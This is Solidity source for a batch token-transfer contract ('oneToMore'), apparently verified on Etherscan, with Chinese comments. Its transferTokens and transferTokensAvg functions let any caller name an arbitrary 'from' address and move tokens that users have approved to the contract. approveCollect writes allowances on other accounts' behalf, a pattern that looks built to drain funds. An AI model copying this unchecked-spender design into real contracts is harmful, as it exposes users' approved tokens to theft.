/**
 *Submitted for verification at Etherscan.io on 2021-06-16
*/

/**
 *Submitted for verification at Etherscan.io on 2021-06-03
*/

pragma solidity ^0.4.18;

contract oneToMore{
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    address owner = 0x0;
    address private m_tokenOwner;
    
    /**
     * 可用金额授权
     **/
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
        return true;
    }
    
    /**
     *  查询授权余额
     **/
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    
    /**
     * 直接转账-1
     **/
    function transfer(address _to, uint256 _value) public returns (bool success) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            return true;
        } else {
            return false;
        }
    }
    
    /**
     * 直接转账-2 
     **/
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            emit Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }
    
    
    /**
     * ERC20 Token代币转账
     **/
     
    
    /**
     * 平均批量转账
     **/
    function transferTokensAvg(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint i=0;i<_tos.length;i++){
            require(caddress.call(id,from,_tos[i],v));
        }
        return true;
    }
    
    
    /**
     * 批量转账
     **/
    function transferTokens(address from,address caddress,address[] _tos,uint[] values)public returns (bool){
     
        //用户数组的长度大于零
        require(_tos.length > 0);
		//金额数组的长度大于零
        require(values.length > 0);
		//两个数组相等
        require(values.length == _tos.length);
        bytes4 id=bytes4(keccak256("transferFrom(address,address,uint256)"));
        for(uint i=0;i<_tos.length;i++){
          require(caddress.call(id,from,_tos[i],values[i]));
        }
        return true;
    }


    /**
      * 每一个账号转统一金额的代币
      * 
      * */
    function transferCollect(address[] _from,  uint256 _value) payable public {
        for(uint256 i = 0; i < _from.length; i++){
            transferFrom(_from[i], msg.sender, _value);
        }
    }
    /**
     * 
     * 批量授权账号
     * 
     * */
    function approveCollect(address[] spender, uint tokens) public returns (bool success) {
        
        require( msg.sender == m_tokenOwner);
        
        for(uint256 i = 0; i < spender.length; i++)
        {
            allowed[ spender[i] ][msg.sender] = tokens;
            // 触发相应的事件
            emit Approval(spender[i], msg.sender, tokens);
        }
        
        success = true;
    }


}